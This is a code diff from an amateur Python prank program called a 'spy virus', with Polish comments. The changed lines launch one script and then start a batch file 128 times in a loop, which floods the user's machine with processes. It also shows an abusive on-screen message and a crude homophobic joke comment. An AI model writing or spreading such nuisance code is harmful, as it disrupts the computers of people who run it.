@@ -54,8 +54,8 @@ def Spyvirusmain(): #definiowanie
     text.set("{0}- I WILL NOT READ THIS, HERE GO FUCK YOURSELF ".format(name.get())) #przycisk ktory jest useless
 ok = tk.Button(window, text="OK", width=20, command=Spyvirusmain)
 ok.pack()
-os.system("C:\spei\image.py") #obrazek szpiega
+os.system("start C:\spei\image.py") #obrazek szpiega
 #wszystko skradzione z jakiejs strony bo jestem script kidem
 for i in range(128):
-    os.system("C:\spei\weird.py")
+    os.system("start C:\spei\weird.cmd")
 #downloading gay porn intensives
